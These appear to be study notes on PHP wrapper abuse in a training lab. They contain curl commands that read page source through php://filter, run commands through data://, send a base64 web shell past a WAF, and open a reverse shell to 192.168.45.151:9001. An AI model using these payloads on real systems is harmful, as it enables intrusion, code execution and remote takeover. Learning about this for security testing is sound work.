# PHP Wrappers

## php://filter

If you see a page that doesn't include a closing `<body>` tag for reasons such as it being under maintenance, we can still view the hidden information with the `php://filter` wrapper.

Given the original request:

```bash
# Original request
curl http://mountaindesserts.com/meteor/index.php?page=admin.php

# Wrapper
php://filter/convert.base64-encode

# Modified request
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

We can then decode the output to view the entire page even if it was originally cutoff.

**Note:** This technique can also be used with LFI

### data://

In the same context, we can utilize the `data://` wrapper to obtain RCE.

```bash
# Original request
curl http://mountaindesserts.com/meteor/index.php?page=admin.php

# Wrapper
data://text/plain,

# Modified request
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

# Base64 encoded to bypass WAF (possibly filtering on the string "system")
curl 'http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls'

# Base64 encoded reverse shell
curl 'http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTUxLzkwMDEgMD4mMSciKTs/Pgo='
```
